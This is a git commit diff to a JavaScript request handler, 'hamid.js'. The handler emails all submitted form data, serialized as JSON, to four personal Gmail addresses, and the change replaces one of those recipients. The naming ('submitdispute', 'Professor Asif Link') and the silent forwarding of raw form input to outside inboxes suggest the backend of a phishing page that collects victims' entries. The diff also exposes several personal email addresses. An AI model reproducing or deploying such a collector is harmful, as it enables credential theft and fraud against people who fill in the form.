ebd7eb4c56869576b8cbb0631b3913e4d0af3270
zm9807350 <zm9807350@gmail.com>
2026-01-12 21:01:47 +0500

    Update hamid.js

--- hamid.js
+++ hamid.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,hamidnizamani87@gmail.com",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,hamidnizamani509@gmail.com",
       subject: "Hamid",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
